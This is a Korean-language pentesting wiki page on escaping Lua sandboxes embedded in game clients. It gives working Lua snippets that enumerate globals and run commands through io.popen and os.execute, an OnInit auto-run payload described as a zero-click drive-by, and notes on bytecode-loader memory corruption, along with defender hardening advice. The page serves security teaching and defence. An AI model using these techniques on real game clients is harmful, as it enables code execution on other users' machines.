# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

이 페이지는 애플리케이션(특히 game clients, plugins, 또는 in-app scripting engines)에 내장된 Lua "sandboxes"를 열거하고 탈출하는 실용적인 기법들을 모아둡니다. 많은 엔진이 제한된 Lua 환경을 노출하지만, 바이트코드 로더가 노출되는 경우 임의 명령 실행이나 네이티브 메모리 손상까지 가능한 강력한 globals에 접근할 수 있도록 남겨두는 경우가 많습니다.

Key ideas:
- VM을 알 수 없는 환경으로 취급하세요: _G를 열거하여 어떤 위험한 primitives에 접근 가능한지 확인합니다.
- stdout/print이 차단된 경우, 결과를 관찰하기 위해 in-VM UI/IPC 채널을 출력 싱크로 악용하세요.
- io/os가 노출되어 있으면, 보통 직접 명령 실행(io.popen, os.execute)이 가능합니다.
- load/loadstring/loadfile이 노출되어 있으면, 조작된 Lua bytecode 실행으로 일부 버전에서 메모리 안전성이 무너질 수 있습니다 (≤5.1의 verifier는 우회 가능; 5.2는 verifier를 제거), 이를 통해 고급 익스플로잇이 가능해집니다.

## Enumerate the sandboxed environment

- Dump the global environment to inventory reachable tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- print()이 사용 불가능하면 in-VM 채널을 재사용하세요. MMO housing script VM의 예로, 채팅 출력은 사운드 호출 이후에만 동작합니다; 다음은 신뢰할 수 있는 출력 함수를 구축하는 예입니다:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
대상에 대해 이 패턴을 일반화하라: 문자열을 허용하는 모든 textbox, toast, logger, 또는 UI callback은 reconnaissance를 위한 stdout 역할을 할 수 있다.

## io/os가 노출된 경우 직접적인 command execution

sandbox가 여전히 표준 라이브러리인 io or os를 노출하고 있다면, 아마 즉시 command execution이 가능할 것이다:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
참고:
- 실행은 client 프로세스 내부에서 발생합니다; 외부 디버거를 차단하는 많은 anti-cheat/antidebug 계층은 in-VM process 생성은 막지 못합니다.
- 또한 확인할 것: package.loadlib (임의의 DLL/.so 로딩), require with native modules, LuaJIT's ffi (존재하는 경우), 그리고 debug library (VM 내부에서 권한 상승을 일으킬 수 있음).

## Zero-click triggers via auto-run callbacks

호스트 애플리케이션이 clients에 스크립트를 푸시하고 VM이 auto-run hooks를 노출한다면(예: OnInit/OnLoad/OnEnter), 스크립트가 로드되자마자 drive-by compromise를 위해 payload를 그곳에 배치하세요:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Any equivalent callback (OnLoad, OnEnter, etc.) generalizes this technique when scripts are transmitted and executed on the client automatically.

## Recon 동안 찾아야 할 위험한 프리미티브

During _G enumeration, specifically look for:
- io, os: io.popen, os.execute, 파일 I/O, 환경 접근.
- load, loadstring, loadfile, dofile: 소스 또는 바이트코드 실행; 신뢰할 수 없는 바이트코드 로딩을 허용.
- package, package.loadlib, require: 동적 라이브러리 로딩 및 모듈 인터페이스.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, 및 훅.
- LuaJIT-only: ffi.cdef, ffi.load to call native code directly.

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## 선택적 권한 상승: Lua bytecode 로더 악용

load/loadstring/loadfile가 접근 가능하지만 io/os가 제한된 경우, 조작된 Lua bytecode를 실행하면 메모리 노출 및 손상 프리미티브로 이어질 수 있습니다. 주요 내용:
- Lua ≤ 5.1은 알려진 우회가 있는 bytecode verifier를 포함하고 있었습니다.
- Lua 5.2는 verifier를 완전히 제거했습니다(공식 입장: 애플리케이션은 precompiled chunks를 거부해야 함). 따라서 bytecode loading이 금지되지 않으면 공격 표면이 넓어집니다.
- 일반적인 워크플로: in-VM 출력으로 포인터를 leak한 뒤, bytecode를 만들어 type confusions(예: FORLOOP 주변이나 다른 opcodes 관련)를 유발하고, 그다음 arbitrary read/write나 native code execution으로 전환합니다.

이 경로는 engine/version-specific하며 RE가 필요합니다. 심층 분석, exploitation primitives 및 게임에서의 예제 가젯은 참고문헌을 참조하세요.

## 탐지 및 강화 노트 (수비자용)

- Server side: 사용자 스크립트를 거부하거나 재작성; 안전한 API를 allowlist; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi를 제거하거나 빈 바인딩으로 대체.
- Client side: 최소화된 _ENV로 Lua 실행; bytecode loading 금지; 엄격한 bytecode verifier 또는 서명 검사 재도입; 클라이언트 프로세스에서의 프로세스 생성 차단.
- Telemetry: script load 직후 gameclient → 자식 프로세스 생성에 대해 경보; UI/chat/script 이벤트와 상관관계 분석.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
